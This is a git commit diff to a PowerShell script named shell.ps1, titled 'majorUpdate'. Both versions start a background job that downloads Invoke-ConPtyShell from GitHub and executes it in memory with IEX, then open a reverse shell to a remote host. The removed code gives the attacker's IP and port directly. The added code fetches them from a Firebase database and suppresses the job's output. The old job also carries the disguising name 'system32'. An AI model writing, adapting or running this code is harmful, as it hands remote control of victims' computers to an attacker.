6822d1726e23aec6c2e5109da9ba9fee256cdaab
currone <94299594+snackmasta@users.noreply.github.com>
2024-01-27 16:57:47 +0700

    majorUpdate

--- shell.ps1
+++ shell.ps1
@@ -1,4 +1,10 @@
-Start-Job -Name "system32" -ScriptBlock {
-    IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing);
-    Invoke-ConPtyShell 18.141.129.246 16976
-}
+Start-Job {
+    $ip="$(Invoke-RestMethod -Uri https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/data/website/ip.json)"
+    $port="$(Invoke-RestMethod -Uri https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/data/website/port.json)"
+
+    IEX(
+        IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing
+    )
+
+    Invoke-ConPtyShell "$ip" "$port"
+} | Out-Null
